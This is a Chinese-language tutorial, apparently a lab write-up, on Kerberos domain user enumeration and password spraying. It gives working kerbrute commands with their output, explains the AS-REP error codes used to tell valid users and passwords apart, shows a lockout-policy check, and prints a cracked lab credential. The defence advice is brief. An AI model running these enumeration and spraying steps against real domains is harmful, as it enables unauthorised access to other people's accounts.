---
title: 域类用户枚举和密码喷洒
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# 域类用户枚举和密码喷洒

## 域内用户枚举

### 原理

域内用户枚举可以在无域内有效凭据的情况下，枚举出域内存在的用户名，并对其进行密码喷洒攻击，以此获得域内的有效凭据

Kerberos协议认证的AS-REQ阶段，客户端向AS发送请求包总统，cname字段对应的值是用户名，AS对用户名验证，用户状态分别为用户存在并启动（需要密码认证），用户存在但禁用，用户不存在时，AS-REP返回的数据包的内容各不相同

| **用户状态** | **AS-REP返回包信息** |
| --- | --- |
| 用户存在且启用，但是没有提供密码 | `KRB5DC_ERR_PREAUTH_REQUIRED`（需要额外的预认证） |
| 用户存在但禁用 | `KRB5DC_ERR_CLIENT_REVOKED NT Status: STATUS_ACCOUNTDISADLED`（用户状态不可用） |
| 用户不存在 | `KRB5DC_ERR_C_PRINCIPAL_UNKNOWN`（在Kerberos数据库中找不到此用户） |

### 域内枚举用户抓包分析

| **用户** | **用户状态** |
| --- | --- |
| a | 用户存在且启用，但是没有提供密码 |
| Guest | 用户存在但禁用 |
| Unknow | 用户不存在 |

通过kerbrute来枚举域内用户，并且使用`wireshark`抓包查看返回包

> https://github.com/ropnop/kerbrute
> 
1. 我们将三个用户名写进`username.txt` 作字典
2. 通过`kerbrute`来枚举域内用户
    
    ```python
    C:\>kerbrute_windows_amd64.exe userenum -d god.org username.txt
    
        __             __               __
       / /_____  _____/ /_  _______  __/ /____
      / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
     / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
    /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
    
    Version: dev (9cfb81e) - 11/23/24 - Ronnie Flathers @ropnop
    
    2024/11/23 14:44:44 >  Using KDC(s):
    2024/11/23 14:44:44 >   owa.god.org:88
    2024/11/23 14:44:44 >  [+] VALID USERNAME:       a@god.org
    2024/11/23 14:44:44 >  Done! Tested 3 usernames (1 valid) in 0.034 seconds
    ```
    
3. 抓包
    
    ![image.png](image%2014.png)
    
    可以看到三种类型的数据包，从上到下分别是`a`，`guest`，`unknow` 
    
    展开枚举a用户的请求包，回复包是`KRB5DC_ERR_PREAUTH_REQUIRED` 也就是额外认证，也就是缺少密码
    
    ![image.png](image%2015.png)
    
    剩下两个不展开
    

### 如何防御

枚举用户是通过发送大量的AS-REQ包，如果同一IP短时间请求大量AS-REQ，即可判断为异常

默认情况下域内用户名枚举并不会对不存在的用户名发起的AS-REQ包产生任何事件日志，因此日志层面不太好检测

## 域内密码喷洒

也是在kerberos的AS-REQ阶段，请求包用户名是正确的，当用户名存在时，在密码正确和错误的情况下，返回包会不同，所以可进行对域内的用户进行喷洒

这种针对所有账户的密码猜测时为了避免账户被锁定，因为如果目标域设置了用户锁定策略，针对同一个用户的连续密码猜测会导致账户被锁定，所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除账户被锁定的概率。

普通的爆破就是用户名固定来爆破密码，但是密码喷酒是用固定的密码去爆破用户名。

| **用户状态** | **AS-REP返回包信息** |
| --- | --- |
| 用户存在密码错误 | `KRB5KDC_ERR_PREAUTH_FAILED`（用户存在密码错误） |

### 分析数据包

通过`kekeo`向`KDC`分别请求密码正确和密码错误的数据包，然后抓取数据包

![image.png](image%2016.png)

`5`是使用错误的密码去请求的KDC，可以看到返回包是`KRB5KDC_ERR_PREAUTH_FAILED`

`15`是使用正确的密码去请求的KDC，可以看到正常返回了TGT

### 使用工具进行密码喷洒

如果通过`net accounts /domain`可以查询得知目标域不存在密码锁定策略，则可以针对单个用户进行密码字典爆破

```python
C:\Users\administrator>net accounts /domain
强制用户在时间到期之后多久必须注销?:     从不
密码最短使用期限(天):                    1
密码最长使用期限(天):                    42
密码长度最小值:                          7
保持的密码历史记录长度:                  24
锁定阈值:                                从不 # 这个就是锁定策略，现在是没有策略
锁定持续时间(分):                        30
锁定观测窗口(分):                        30
计算机角色:                              PRIMARY
命令成功完成。
```

还是使用`kerbrute` 

```python
kerbrute_windows_amd64.exe passwordspray --dc <域控IP> -d <域名> <用户名字典> <单个密码>    # 适用于有锁定策略的情况
kerbrute_windows_amd64.exe bruteuser --dc <域控IP> -d <域名> <密码字典> <单个用户名>        # 适用于没有锁定策略的情况，严格来说这种是爆破
# 参数
passwordspray			# 密码喷酒模式
--dc					# 指定域控 IP
-d						# 指定域名
```

```python
C:\>kerbrute_windows_amd64.exe passwordspray --dc 192.168.52.138 -d god.org username.txt Aa20040422

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 11/23/24 - Ronnie Flathers @ropnop

2024/11/23 15:15:44 >  Using KDC(s):
2024/11/23 15:15:44 >   192.168.52.138:88
2024/11/23 15:15:44 >  [+] VALID LOGIN:  a@god.org:Aa20040422
2024/11/23 15:15:44 >  Done! Tested 3 logins (1 successes) in 0.016 seconds
```

喷洒结束，`a`的账户可以使用该密码登录

### 如何防御

和上边一样